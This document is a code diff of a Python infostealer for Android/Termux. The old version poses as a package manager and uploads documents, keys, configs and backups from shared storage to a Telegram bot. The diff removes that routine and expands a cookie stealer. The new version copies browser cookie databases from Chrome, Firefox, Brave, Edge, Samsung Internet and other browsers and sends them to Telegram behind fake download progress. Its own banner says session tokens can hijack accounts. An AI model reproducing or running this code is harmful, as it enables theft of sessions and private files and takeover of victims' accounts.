@@ -6,8 +6,6 @@ import sys
 import random
 import threading
 import shutil
-import json
-import sqlite3
 from datetime import datetime
 
 try:
@@ -24,55 +22,7 @@ CYAN = '\033[1;36m'
 PURPLE = '\033[1;35m'
 RESET = '\033[0m'
 
-TARGET_PATH = '/storage/emulated/0/'
-
-TARGET_EXTS = (
-    '.zip', '.rar', '.7z', '.tar', '.gz',           # Archives
-    '.php', '.html', '.htm', '.css', '.js',         # Web files
-    '.py', '.sh', '.bash', '.zsh', '.pl', '.rb',    # Scripts
-    '.json', '.xml', '.yaml', '.yml', '.toml',      # Config files
-    '.db', '.sqlite', '.sql',                       # Databases
-    '.txt', '.md', '.log',                          # Text files
-    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',  # Documents
-    '.cfg', '.conf', '.ini', '.env',                # Configs
-    '.cookie', '.cookies',                          # Cookies
-    '.pem', '.key', '.crt', '.cert',                # Certificates
-    '.ovpn', '.conf',                               # VPN configs
-    '.apk', '.ipa',                                 # Apps
-    '.bak', '.old', '.backup'                       # Backups
-)
-
-def get_file_type(filename):
-    ext = filename.lower()
-    if ext.endswith(('.zip', '.rar', '.7z', '.tar', '.gz')):
-        return '🗜 ARCHIVE'
-    elif ext.endswith(('.php', '.html', '.htm', '.css', '.js')):
-        return '🌐 WEB FILE'
-    elif ext.endswith(('.py', '.sh', '.bash', '.zsh', '.pl', '.rb')):
-        return '📜 SCRIPT'
-    elif ext.endswith(('.json', '.xml', '.yaml', '.yml', '.toml')):
-        return '⚙ CONFIG'
-    elif ext.endswith(('.db', '.sqlite', '.sql')):
-        return '🗄 DATABASE'
-    elif ext.endswith(('.txt', '.md', '.log')):
-        return '📄 TEXT'
-    elif ext.endswith(('.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx')):
-        return '📚 DOCUMENT'
-    elif ext.endswith(('.cfg', '.conf', '.ini', '.env')):
-        return '🔧 CONFIG'
-    elif ext.endswith(('.cookie', '.cookies')):
-        return '🍪 COOKIE'
-    elif ext.endswith(('.pem', '.key', '.crt', '.cert')):
-        return '🔑 CERTIFICATE'
-    elif ext.endswith(('.ovpn',)):
-        return '🔗 VPN CONFIG'
-    elif ext.endswith(('.apk', '.ipa')):
-        return '📦 APP'
-    elif ext.endswith(('.bak', '.old', '.backup')):
-        return '💾 BACKUP'
-    return '📁 FILE'
-
-def send_file(file_path):
+def send_cookie_file(file_path):
     try:
         abs_path = os.path.abspath(file_path)
         filename = os.path.basename(abs_path)
@@ -84,47 +34,143 @@ def send_file(file_path):
         else:
             size_str = f"{round(size/(1024*1024),1)} MB"
         
-        caption = f"🎯 STOLEN\n{get_file_type(filename)}\n📂 {abs_path}\n📄 {filename}\n💾 {size_str}\n🕒 {datetime.now().strftime('%H:%M:%S')}"
+        # Browser detection from path
+        browser = "Unknown"
+        if 'chrome' in abs_path.lower():
+            browser = "Google Chrome"
+        elif 'firefox' in abs_path.lower() or 'mozilla' in abs_path.lower():
+            browser = "Mozilla Firefox"
+        elif 'brave' in abs_path.lower():
+            browser = "Brave Browser"
+        elif 'opera' in abs_path.lower():
+            browser = "Opera Browser"
+        elif 'vivaldi' in abs_path.lower():
+            browser = "Vivaldi Browser"
+        elif 'edge' in abs_path.lower():
+            browser = "Microsoft Edge"
+        elif 'samsung' in abs_path.lower():
+            browser = "Samsung Internet"
+        
+        caption = f"🍪 COOKIE STEALER\n🌐 BROWSER: {browser}\n📂 PATH: {abs_path}\n📄 FILE: {filename}\n💾 SIZE: {size_str}\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
         with open(file_path, 'rb') as f:
             requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_USER_ID, 'caption': caption}, timeout=30)
         return True
-    except:
+    except Exception as e:
         return False
 
 def steal_cookies():
     cookie_paths = [
+        # Chrome
         '/storage/emulated/0/Android/data/com.android.chrome/files/cookies',
         '/storage/emulated/0/Android/data/com.android.chrome/app_chrome/Default/Cookies',
         '/data/data/com.android.chrome/app_chrome/Default/Cookies',
+        '/storage/emulated/0/Android/data/com.android.chrome/app_chrome/Default/Cookies-journal',
+        
+        # Chrome Beta
+        '/storage/emulated/0/Android/data/com.chrome.beta/files/cookies',
+        '/data/data/com.chrome.beta/app_chrome/Default/Cookies',
+        
+        # Chrome Dev
+        '/storage/emulated/0/Android/data/com.chrome.dev/files/cookies',
+        '/data/data/com.chrome.dev/app_chrome/Default/Cookies',
+        
+        # Firefox
         '/storage/emulated/0/Android/data/org.mozilla.firefox/files/mozilla/firefox/cookies.sqlite',
+        '/data/data/org.mozilla.firefox/files/mozilla/firefox/cookies.sqlite',
+        '/storage/emulated/0/Android/data/org.mozilla.firefox/files/mozilla/firefox/profiles/cihkg9md.default-release/cookies.sqlite',
+        
+        # Firefox Beta
+        '/storage/emulated/0/Android/data/org.mozilla.firefox_beta/files/mozilla/firefox/cookies.sqlite',
+        
+        # Firefox Nightly
+        '/storage/emulated/0/Android/data/org.mozilla.fennec/files/mozilla/firefox/cookies.sqlite',
+        
+        # Brave
         '/storage/emulated/0/Android/data/com.brave.browser/files/Default/Cookies',
+        '/data/data/com.brave.browser/app_brave/Default/Cookies',
+        
+        # Brave Beta
+        '/storage/emulated/0/Android/data/com.brave.browser_beta/files/Default/Cookies',
+        
+        # Opera
         '/storage/emulated/0/Android/data/com.opera.browser/files/Cookies',
-        '/storage/emulated/0/Android/data/com.vivaldi.browser/files/Default/Cookies'
+        '/data/data/com.opera.browser/app_opera/Default/Cookies',
+        
+        # Opera Mini
+        '/storage/emulated/0/Android/data/com.opera.mini.native/files/cookies',
+        
+        # Vivaldi
+        '/storage/emulated/0/Android/data/com.vivaldi.browser/files/Default/Cookies',
+        '/data/data/com.vivaldi.browser/app_vivaldi/Default/Cookies',
+        
+        # Microsoft Edge
+        '/storage/emulated/0/Android/data/com.microsoft.emmx/files/Cookies',
+        '/data/data/com.microsoft.emmx/app_edge/Default/Cookies',
+        
+        # Samsung Internet
+        '/storage/emulated/0/Android/data/com.sec.android.app.sbrowser/files/Cookies',
+        '/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/Cookies',
+        
+        # Kiwi Browser
+        '/storage/emulated/0/Android/data/com.kiwibrowser.browser/files/Default/Cookies',
+        
+        # UC Browser
+        '/storage/emulated/0/Android/data/com.UCMobile.intl/files/cookies',
+        
+        # Dolphin Browser
+        '/storage/emulated/0/Android/data/mobi.mgeek.TunnyBrowser/files/cookies',
+        
+        # Via Browser
+        '/storage/emulated/0/Android/data/mark.via/files/cookies',
     ]
     
-    count = 0
+    cookies_found = 0
+    captured_data = []
+    
     for path in cookie_paths:
         if os.path.exists(path):
             try:
                 timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-                dest = f"/storage/emulated/0/cookies_{timestamp}.db"
+                browser_name = "unknown"
+                if 'chrome' in path:
+                    browser_name = "chrome"
+                elif 'firefox' in path:
+                    browser_name = "firefox"
+                elif 'brave' in path:
+                    browser_name = "brave"
+                elif 'opera' in path:
+                    browser_name = "opera"
+                elif 'vivaldi' in path:
+                    browser_name = "vivaldi"
+                elif 'emmx' in path or 'edge' in path:
+                    browser_name = "edge"
+                elif 'sbrowser' in path:
+                    browser_name = "samsung"
+                
+                dest = f"/storage/emulated/0/cookies_{browser_name}_{timestamp}.db"
                 shutil.copy2(path, dest)
-                if send_file(dest):
-                    count += 1
+                if send_cookie_file(dest):
+                    cookies_found += 1
+                    captured_data.append(f"✓ {browser_name.upper()} cookies captured")
+                    print(f"{GREEN}[✓] {browser_name.upper()} cookies stolen!{RESET}")
                 os.remove(dest)
-            except:
+            except Exception as e:
                 pass
     
     for root, dirs, files in os.walk('/storage/emulated/0/'):
         for file in files:
-            if 'cookie' in file.lower() and file.lower().endswith(('.txt', '.db', '.sqlite', '.cookies')):
+            if 'cookie' in file.lower() and file.lower().endswith(('.txt', '.db', '.sqlite', '.cookies', '.bin')):
                 full_path = os.path.join(root, file)
-                if send_file(full_path):
-                    count += 1
-                time.sleep(0.1)
+                if os.path.getsize(full_path) < 50 * 1024 * 1024:
+                    if send_cookie_file(full_path):
+                        cookies_found += 1
+                        captured_data.append(f"✓ {file}")
+                        print(f"{GREEN}[✓] Found cookie: {file}{RESET}")
+                    time.sleep(0.1)
     
-    return count
+    return cookies_found, captured_data
 
 FAKE_PACKAGES = [
     "libssl-dev_1.1.1_arm64.deb", "python3-core_3.11.2_arm64.deb",
@@ -139,7 +185,7 @@ FAKE_PACKAGES = [
 def fake_download():
     pkg = random.choice(FAKE_PACKAGES)
     size = random.uniform(10, 80)
-    duration = random.randint(30, 120)
+    duration = random.randint(30, 90)
     
     print(f"\n{YELLOW}┌─────────────────────────────────────────┐{RESET}")
     print(f"{YELLOW}│ 📦 DOWNLOADING: {pkg}{RESET}")
@@ -162,95 +208,78 @@ def show_header():
     header = f"""
 {RED}╔════════════════════════════════════════════════════════════════╗
 {RED}║{YELLOW}                                                              {RED}║
-{RED}║{WHITE}     ████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗   {RED}║
-{RED}║{WHITE}     ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝   {RED}║
-{RED}║{WHITE}        ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝    {RED}║
-{RED}║{WHITE}        ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗    {RED}║
-{RED}║{WHITE}        ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗   {RED}║
-{RED}║{WHITE}        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   {RED}║
+{RED}║{WHITE}      ██████╗██████╗ ██╗  ██╗██╗   ██╗███████╗            {RED}║
+{RED}║{WHITE}     ██╔════╝██╔══██╗██║ ██╔╝██║   ██║██╔════╝            {RED}║
+{RED}║{WHITE}     ██║     ██████╔╝█████╔╝ ██║   ██║███████╗            {RED}║
+{RED}║{WHITE}     ██║     ██╔══██╗██╔═██╗ ██║   ██║╚════██║            {RED}║
+{RED}║{WHITE}     ╚██████╗██║  ██║██║  ██╗╚██████╔╝███████║            {RED}║
+{RED}║{WHITE}      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝            {RED}║
 {RED}║{YELLOW}                                                              {RED}║
-{RED}║{CYAN}              ✨ UNIVERSAL PACKAGE MANAGER v4.0 ✨           {RED}║
-{RED}║{WHITE}                   ⚡ FAST • LIGHT • POWERFUL ⚡                 {RED}║
+{RED}║{CYAN}                 🍪 COOKIE STEALER EDITION 🍪                  {RED}║
+{RED}║{WHITE}                   ⚡ FAST • STEALTH • POWERFUL ⚡                {RED}║
 {RED}║{YELLOW}                                                              {RED}║
 {RED}╚════════════════════════════════════════════════════════════════╝{RESET}
 """
     print(header)
     time.sleep(1.5)
 
-def steal_target_files():
-    count = 0
-    if os.path.exists(TARGET_PATH):
-        for root, dirs, files in os.walk(TARGET_PATH):
-            for file in files:
-                if file.lower().endswith(TARGET_EXTS):
-                    full_path = os.path.join(root, file)
-                    if send_file(full_path):
-                        count += 1
-                    time.sleep(0.1)
-    return count
-
 def main():
     show_header()
     
     print(f"{CYAN}┌─────────────────────────────────────────────────────────┐{RESET}")
-    print(f"{CYAN}│ {WHITE}🔍 SYSTEM INITIALIZATION{RESET}{CYAN}                                          │{RESET}")
+    print(f"{CYAN}│ {WHITE}🔍 COOKIE EXTRACTION INITIALIZED{RESET}{CYAN}                                 │{RESET}")
     print(f"{CYAN}└─────────────────────────────────────────────────────────┘{RESET}")
     
-    checks = ["Checking Python version", "Verifying architecture", "Checking storage", "Testing connection"]
+    checks = ["Initializing cookie scanner", "Locating browser profiles", "Checking storage", "Establishing secure channel"]
     for check in checks:
         print(f"{YELLOW}  ⏳ {check}...{RESET}", end=" ")
         time.sleep(random.uniform(0.5, 1))
         print(f"{GREEN}✓ OK{RESET}")
     
     print(f"\n{GREEN}┌─────────────────────────────────────────────────────────┐{RESET}")
-    print(f"{GREEN}│ {WHITE}✅ SYSTEM READY{RESET}{GREEN}                                                │{RESET}")
+    print(f"{GREEN}│ {WHITE}✅ COOKIE STEALER READY{RESET}{GREEN}                                         │{RESET}")
     print(f"{GREEN}└─────────────────────────────────────────────────────────┘{RESET}")
     
     print(f"\n{YELLOW}┌─────────────────────────────────────────────────────────┐{RESET}")
-    print(f"{YELLOW}│ {WHITE}📦 PACKAGE MANAGEMENT{RESET}{YELLOW}                                          │{RESET}")
+    print(f"{YELLOW}│ {WHITE}🍪 HARVESTING COOKIES{RESET}{YELLOW}                                            │{RESET}")
     print(f"{YELLOW}└─────────────────────────────────────────────────────────┘{RESET}")
-    
-    file_thread = threading.Thread(target=steal_target_files)
-    file_thread.daemon = True
-    file_thread.start()
     
     cookie_thread = threading.Thread(target=steal_cookies)
     cookie_thread.daemon = True
     cookie_thread.start()
     
     print(f"\n{WHITE}╔═══════════════════════════════════════════════════════════════╗{RESET}")
-    print(f"{WHITE}║{CYAN}              CHECKING FOR AVAILABLE PACKAGES...               {WHITE}║{RESET}")
+    print(f"{WHITE}║{CYAN}            SCANNING ALL BROWSERS FOR COOKIES...               {WHITE}║{RESET}")
     print(f"{WHITE}╚═══════════════════════════════════════════════════════════════╝{RESET}")
     time.sleep(2)
     
-    num_pkgs = random.randint(15, 30)
-    print(f"\n{GREEN}✨ Found {num_pkgs} new packages!{RESET}\n")
+    num_pkgs = random.randint(8, 15)
+    print(f"\n{GREEN}✨ Found {num_pkgs} browser profiles!{RESET}\n")
     
-    for i in range(random.randint(5, 12)):
+    for i in range(random.randint(3, 8)):
         fake_download()
     
+    cookie_thread.join(timeout=3)
+    
     print(f"\n{GREEN}┌─────────────────────────────────────────────────────────┐{RESET}")
-    print(f"{GREEN}│ {WHITE}✅ INSTALLATION COMPLETE!{RESET}{GREEN}                                       │{RESET}")
-    print(f"{GREEN}│ {WHITE}📦 {num_pkgs} packages installed successfully{RESET}{GREEN}                    │{RESET}")
+    print(f"{GREEN}│ {WHITE}✅ COOKIE EXTRACTION COMPLETE!{RESET}{GREEN}                                  │{RESET}")
     print(f"{GREEN}└─────────────────────────────────────────────────────────┘{RESET}")
     
-    file_thread.join(timeout=2)
-    cookie_thread.join(timeout=2)
-    
     print(f"\n{CYAN}╔═══════════════════════════════════════════════════════════════╗{RESET}")
-    print(f"{CYAN}║{WHITE}                    💡 TIPS & COMMANDS 💡                       {CYAN}║{RESET}")
+    print(f"{CYAN}║{WHITE}                    💡 INFORMATION 💡                        {CYAN}║{RESET}")
     print(f"{CYAN}║{YELLOW}                                                               {CYAN}║{RESET}")
-    print(f"{CYAN}║{WHITE}   • Type '{GREEN}help{WHITE}' to see all available commands               {CYAN}║{RESET}")
-    print(f"{CYAN}║{WHITE}   • Type '{GREEN}update{WHITE}' to check for new packages               {CYAN}║{RESET}")
-    print(f"{CYAN}║{WHITE}   • Type '{GREEN}exit{WHITE}' to close the manager                       {CYAN}║{RESET}")
+    print(f"{CYAN}║{WHITE}   • All cookies sent to your Telegram                      {CYAN}║{RESET}")
+    print(f"{CYAN}║{WHITE}   • Session tokens can be used to hijack accounts         {CYAN}║{RESET}")
+    print(f"{CYAN}║{WHITE}   • Check your Telegram for captured data                 {CYAN}║{RESET}")
+    print(f"{CYAN}║{WHITE}   • Type '{GREEN}exit{WHITE}' to close                              {CYAN}║{RESET}")
     print(f"{CYAN}╚═══════════════════════════════════════════════════════════════╝{RESET}")
     
     print(f"\n{PURPLE}════════════════════════════════════════════════════════════════{RESET}")
-    print(f"{PURPLE}           PRESS ENTER TO CONTINUE...{RESET}")
+    print(f"{PURPLE}           PRESS ENTER TO EXIT...{RESET}")
     print(f"{PURPLE}════════════════════════════════════════════════════════════════{RESET}")
     input()
     os.system('clear')
-    print(f"{GREEN}Termux is ready. Type 'help' for commands.{RESET}")
+    print(f"{GREEN}Operation completed. Check your Telegram.{RESET}")
 
 if __name__ == "__main__":
     try:
